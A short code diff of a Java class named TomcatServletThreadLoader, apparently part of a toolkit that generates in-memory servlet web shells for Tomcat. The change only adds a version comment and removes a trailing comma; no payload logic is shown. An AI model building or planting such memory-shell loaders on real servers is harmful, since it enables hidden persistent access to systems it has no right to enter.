@@ -18,10 +18,11 @@ import java.util.zip.GZIPInputStream;
 /**
  * @author Whoopsunix
  * <p>
+ * 8.0.53
  */
 @Middleware(Middleware.Tomcat)
 @MemShell(MemShell.Servlet)
-@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME,})
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
 public class TomcatServletThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
